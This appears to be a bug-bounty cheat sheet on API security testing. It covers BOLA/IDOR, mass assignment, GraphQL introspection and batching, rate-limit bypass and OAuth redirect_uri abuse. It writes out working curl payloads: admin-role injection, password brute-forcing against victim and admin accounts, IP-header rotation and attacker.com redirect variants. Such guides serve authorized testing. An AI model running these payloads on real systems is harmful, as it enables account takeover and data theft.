# API Testing

> One-line summary: APIs expose more logic and trust more input than the UI, and authorization is frequently enforced client-side — broken object-level authz, mass assignment, and version rollbacks pay reliably.

## Overview

APIs (REST and GraphQL) are the same application logic without the UI's guard rails: endpoints accept raw JSON, honor HTTP methods, and trust fields the interface never sends. Most modern API bugs are authorization bugs — the endpoint checks *that you are logged in* but not *what you may access* (BOLA/IDOR), or it binds every field in the request body straight to a model (mass assignment). Versioning and shadow endpoints multiply the attack surface because old or internal versions often skip checks the current one added. In bug bounty, API findings pay well because one broken object reference generalizes to every record in the collection, and mass assignment often hands over admin roles in a single request.

## Where to find it

- REST endpoints returning JSON, especially: `/api/v1/...`, `/internal/...`, `/beta/...`, `/graphql`, `/rpc`, `/rest/`, `/admin/api/...`
- Versioning surfaces: path (`/v1` vs `/v2` vs `/v3`), header (`X-Api-Version: 2`, `Accept: application/vnd.target.v2+json`), query (`?api_version=2`), host (`api-v2.target.com`)
- Specs and docs: `/swagger.json`, `/openapi.json`, `/api-docs`, `/swagger-ui.html`, `/redoc`, `/.well-known/`, `/graphql?sdl`, Postman/Insomnia collections on GitHub
- Mobile/legacy traffic: APK decompile (`apktool`, `jadx`), mitmproxy capture — mobile APIs usually lag behind web hardening
- Mass assignment candidates: registration, profile update, settings, org/team create, checkout, anything accepting a full JSON object
- Method confusion: `PUT`/`PATCH`/`DELETE` on GET-only paths, `X-HTTP-Method-Override`, `_method=DELETE`
- OAuth/OIDC flows: `/authorize` `redirect_uri` handling, `/token`, implicit flow, PKCE downgrade, `client_secret` reuse across environments
- Rate-limit-sensitive endpoints: login, OTP verify, password reset, invitation accept, coupon apply

## Methodology

1. **Enumerate routes** — kiterunner against `.kite` wordlists, ffuf against your own wordlist, plus endpoints extracted from JS bundles and mobile APKs. Collect swagger/openapi specs; if you find one, generate one request per endpoint per method from it.
2. **Map the API surface** — for each endpoint record: methods, content types, parameters, auth requirement (compare with/without token: 200 vs 401), and role requirement (compare low-priv vs high-priv tokens: 200 vs 403).
3. **Fuzz undocumented parameters** — arjun per endpoint per method (GET/POST/JSON). Undocumented params (debug, admin, internal, test, preview) frequently toggle behavior.
4. **Test authorization on every endpoint with two accounts** — swap object IDs between account A and B (BOLA), swap roles, and test nested collections. `GET /api/orders/101` with A's token but B's order ID is the highest-yield single test in API hunting.
5. **Mass assignment** — take the GET response of your own object, replay it verbatim as PATCH/PUT with extra privileged fields (`role`, `is_admin`, `verified`, `balance`, `tenant_id`) and watch what the response echoes.
6. **Version and shadow-path diffing** — replay every request against `/v1`, `/v2`, `/v0`, `/beta`, `/internal`, and header-version variants; older versions commonly lack newer authz checks, newer ones sometimes lack input filters.
7. **GraphQL** — attempt introspection; if disabled, use field-suggestion errors and clairvoyance-style recovery. Then test authorization per field, aliasing/batching for rate-limit bypass, and query depth abuse.
8. **Rate limits** — hammer login/OTP/reset; if throttled, rotate `X-Forwarded-For`, `X-Real-IP`, `X-Client-IP`, `True-Client-IP`, and try batching (GraphQL aliases, JSON arrays) and race windows (Turbo Intruder single-packet attack).
9. **Content-type and parser confusion** — resend JSON bodies as form-encoded and XML; duplicate keys (`{"role":"user","role":"admin"}`) and array-wrapping (`id[]=1`) behave differently per parser.
10. **Prove impact** — one reproduced request chain with two accounts: the exact call proving cross-tenant read or privilege granted (role changed in a subsequent token/profile fetch), with both raw requests.

## Payloads

```bash
# Swagger/OpenAPI discovery
for p in swagger.json v2/api-docs v3/api-docs openapi.json api-docs swagger-ui.html .well-known/openapi.json; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$p")
  [ "$code" = "200" ] && echo "FOUND: https://target.com/$p"
done

# Enumerate API routes (kiterunner + classic wordlist)
kr scan https://target.com -w routes-large.kite -x 20
ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -fc 404 -t 50

# Version probing on one endpoint
for v in v1 v2 v3 v0 beta internal legacy; do
  echo "$v -> $(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $TOKEN" "https://target.com/api/$v/users/1")"
done
```

```bash
# BOLA check: same request, two accounts (run as A then B with B's object ID)
curl -s "https://target.com/api/v1/users/1002/orders" -H "Authorization: Bearer $TOKEN_A"
# Vulnerable if A's token returns user 1002's orders.

# Mass assignment: replay GET response + privileged fields
curl -s -X PATCH "https://target.com/api/v1/users/me" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"email":"me@example.com","role":"admin","is_admin":true,"email_verified":true,"tenant_id":1}'

# Method override / method confusion
curl -s -X POST "https://target.com/api/v1/users/me" -H "Authorization: Bearer $TOKEN" \
  -H "X-HTTP-Method-Override: PUT" -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
curl -s -X DELETE "https://target.com/api/v1/admin/tenants/7" -H "Authorization: Bearer $LOW_PRIV"

# Parameter discovery
arjun -u "https://target.com/api/v1/user" -m GET
arjun -u "https://target.com/api/v1/user" -m POST
arjun -u "https://target.com/api/v1/user" -m JSON
```

```bash
# GraphQL introspection (compact)
curl -s -X POST https://target.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{queryType{name}mutationType{name}types{name kind fields{name args{name type{name kind ofType{name}}}}}}}"}'

# GraphQL SDL shortcut (GraphQL Yoga and friends)
curl -s "https://target.com/graphql?sdl"
```

```json
{
  "query": "mutation { a1: login(email:\"admin@target.com\", password:\"123456\"){token} a2: login(email:\"admin@target.com\", password:\"password\"){token} }"
}
```

```bash
# Rate-limit bypass: rotate client-IP headers
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target.com/api/login \
    -H "Content-Type: application/json" -H "X-Forwarded-For: 10.0.0.$i" \
    -d '{"email":"victim@example.com","password":"guess'"$i"'"}'
done
```

## Bypasses & edge cases

- **Authorization bypass tricks** — trailing slash/case (`/Admin`, `/users/1/`), path normalization (`/api/v1/./admin`, `/api/%2e%2e/admin`), semicolons (`/api/admin;/users`), and framework override headers `X-Original-URL: /admin`, `X-Rewrite-URL: /admin`.
- **Versioning quirks** — old versions often disable auth entirely on admin routes added later; header-versioned responses can be cached under the same URL (cache poisoning interplay).
- **GraphQL specifics** — introspection off doesn't stop field-suggestion errors ("Did you mean...") from leaking the schema; aliases (`a1:`, `a2:`) turn one query into hundreds of attempts bypassing per-request limits; batched operations (array of queries) bypass 2FA attempt limits; GET requests to `/graphql` sometimes allow CSRF on mutations where the server accepts `query` in the query string.
- **Parser confusion** — duplicate JSON keys (`{"role":"user","role":"admin"}` — last or first wins depending on parser), scalar vs array (`"id":[1,2]`, `id[]=1&id[]=2`), numeric-string confusion (`"tenant_id":"1"`), and content-type switching (JSON → `application/x-www-form-urlencoded` → XML changes what gets bound).
- **Mass assignment negatives** — if fields are rejected, try nested objects (`"profile":{"role":"admin"}`), alternate casings (`isAdmin`, `is_admin_`), and PascalCase (`Role`) — some serializers are case-insensitive.
- **Rate-limit gaps** — throttling keyed on IP only: rotate proxies/`X-Forwarded-For`; keyed on account: try case variations (`Admin@`, `admin+1@`), whitespace, and batching; keyed per-endpoint: replay on `/login` vs `/api/v1/login` vs mobile path.
- **OAuth** — `redirect_uri` variants: `https://attacker.com`, `https://target.com.attacker.com`, `https://target.com@attacker.com`, `https://attacker.com/target.com`, path traversal (`/oauth/../callback`), and open-redirect chaining; missing `state` → CSRF; code reuse; PKCE downgrade (strip `code_challenge`); `client_secret` shared across envs.
- **Shadow APIs** — internal mobile-only endpoints discovered in APKs often have zero rate limits and weaker authz than their web twins.

## Tools

```bash
# kiterunner — fast API route brute force (download routes-large.kite from releases)
kr scan https://target.com -w routes-large.kite -x 20
kr brute https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt

# arjun — hidden parameter discovery (GET/POST/JSON/XML)
arjun -u "https://target.com/api/v1/user" -m GET

# ffuf — endpoint/content fuzzing
ffuf -u https://target.com/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -fc 404

# GraphQL tooling
graphw00f -d -f -t https://target.com/graphql          # fingerprint the engine
python3 graphql-cop.py -t https://target.com/graphql   # check common GraphQL misconfigs
clairvoyance https://target.com/graphql -o schema.json # schema recovery when introspection is off (add -w <wordlist> if required)
# InQL (Burp BApp) — introspection + query generation from schema

# Mobile API extraction
apktool d app.apk && jadx-gui app.apk
mitmproxy -p 8080   # capture then replay with curl/Postman

# nuclei — exposed specs, tokens, misconfigs
nuclei -u https://target.com -tags exposure
```

## Escalation & chaining

- **BOLA → mass data** — one IDOR on a collection endpoint usually means the whole collection: demonstrate with two records, then state the endpoint returns N records total.
- **Mass assignment → admin** — set `role`/`is_admin`/`tenant_id`, then fetch your profile or a new token to prove the server persisted it; admin access multiplies every other finding.
- **GraphQL batching → 2FA/OTP brute force** — hundreds of aliases per request bypass attempt limits, then ATO.
- **OAuth → ATO** — `redirect_uri` open redirect or missing `state` plus code interception yields victim sessions without touching credentials.
- **Verbose errors → SSRF/internal** — API stack traces and validation errors leak internal hostnames, DB drivers, and versions that seed SSRF path guessing and framework-specific exploits.
- **API + cache** — unauthenticated API responses cached on shared edges leak one user's data to another (cache deception variants on `/api/...` paths).
- **Shadow API + no rate limit** — mobile-only login endpoints without throttling convert to credential stuffing at scale; report the missing control even alone as medium.

## Report notes

- Two-account proof for authorization bugs: raw request from account A against account B's object, with both accounts' setup described; never dump other users' PII beyond one redacted record.
- For mass assignment: the exact extra fields, the request, the response showing the change, and a follow-up request (token/profile/role check) proving persistence.
- Version-diff findings: both requests side by side (v2 blocked, v1 allowed) — triage needs to see the exact difference.
- List every affected endpoint (a table: endpoint, method, impact) rather than one-off examples; collections scale the bounty.
- Remediation specifics help grading: object-level authorization checks, field allowlists (DTOs), disable legacy versions, per-account rate limits.

## References

- [PortSwigger — API testing](https://portswigger.net/web-security/api-testing)
- [PortSwigger — GraphQL](https://portswigger.net/web-security/graphql)
- [PortSwigger — OAuth 2.0 authentication vulnerabilities](https://portswigger.net/web-security/oauth)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [OWASP WSTG — API Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/)
- [kiterunner](https://github.com/assetnote/kiterunner)
- [Arjun](https://github.com/s0md3v/Arjun)
- [graphw00f](https://github.com/dolevf/graphw00f)
- [HackTricks — GraphQL / API testing notes](https://book.hacktricks.xyz/pentesting-web/web-vulnerabilities-methodology)
- [PayloadsAllTheThings — GraphQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)
